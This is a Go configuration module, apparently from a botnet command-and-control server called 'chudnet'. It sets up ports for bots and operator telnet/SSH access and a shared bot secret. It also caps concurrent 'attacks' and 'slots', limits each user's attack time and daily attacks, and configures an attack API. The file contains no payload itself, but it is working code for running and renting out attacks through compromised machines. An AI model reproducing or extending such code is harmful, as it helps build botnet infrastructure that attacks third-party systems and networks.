package main

import (
	"encoding/json"
	"fmt"
	"os"
	"time"
)

type CNCConfig struct {
	BotPort          int    `json:"bot_port"`
	TelnetPort       int    `json:"telnet_port"`
	SSHPort          int    `json:"ssh_port"`
	BotSecret        string `json:"bot_secret"`
	PingInterval     int    `json:"ping_interval"`
	PingTimeout      int    `json:"ping_timeout"`
	MaxSessions      int    `json:"max_sessions"`
	MaxGlobalSlots   int    `json:"max_global_slots"`
	MaxGlobalAttacks int    `json:"max_global_attacks"`
}

type DatabaseConfig struct {
	Path string `json:"path"`
}

type DefaultsConfig struct {
	MaxTime    int `json:"max_time"`
	MaxBots    int `json:"max_bots"`
	MaxSlots   int `json:"max_slots"`
	DailyLimit int `json:"daily_limit"`
}

type APIConfig struct {
	Enabled      bool     `json:"enabled"`
	Port         int      `json:"port"`
	RateLimit    int      `json:"rate_limit"`
	Cooldown     int      `json:"cooldown"`
	Whitelist    []string `json:"whitelist"`
	BlockedHosts []string `json:"blocked_hosts"`
}

type LoggingConfig struct {
	Enabled bool   `json:"enabled"`
	File    string `json:"file"`
	Level   string `json:"level"`
}

type Config struct {
	CNC          CNCConfig      `json:"cnc"`
	Database     DatabaseConfig `json:"database"`
	API          APIConfig      `json:"api"`
	Defaults     DefaultsConfig `json:"defaults"`
	Logging      LoggingConfig  `json:"logging"`
	RootUsername string         `json:"root_username"`
}

func LoadConfig(path string) *Config {
	file, err := os.Open(path)
	if err != nil {
		fmt.Println("[config] failed to open, using defaults:", err)
		return defaultConfig()
	}
	defer file.Close()

	cfg := defaultConfig()
	decoder := json.NewDecoder(file)
	if err := decoder.Decode(cfg); err != nil {
		fmt.Println("[config] decode error, using defaults:", err)
		return defaultConfig()
	}

	fmt.Println("[config] loaded from", path)
	return cfg
}

func defaultConfig() *Config {
	return &Config{
		CNC: CNCConfig{
			BotPort:          7777,
			TelnetPort:       6666,
			SSHPort:          2222,
			PingInterval:     30,
			PingTimeout:      60,
			MaxSessions:      10,
			MaxGlobalSlots:   50,
			MaxGlobalAttacks: 100,
		},
		Database: DatabaseConfig{
			Path: "chudnet.db",
		},
		Defaults: DefaultsConfig{
			MaxTime:    300,
			MaxBots:    -1,
			MaxSlots:   5,
			DailyLimit: 100,
		},
		Logging: LoggingConfig{
			Enabled: true,
			File:    "cnc.log",
			Level:   "INFO",
		},
		API: APIConfig{
			Enabled:      false,
			Port:         8080,
			RateLimit:    30,
			Cooldown:     5,
			Whitelist:    []string{},
			BlockedHosts: []string{"127.0.0.1"},
		},
		RootUsername: "admin",
	}
}

func (c *Config) GetPingInterval() time.Duration {
	return time.Duration(c.CNC.PingInterval) * time.Second
}

func (c *Config) GetPingTimeout() time.Duration {
	return time.Duration(c.CNC.PingTimeout) * time.Second
}
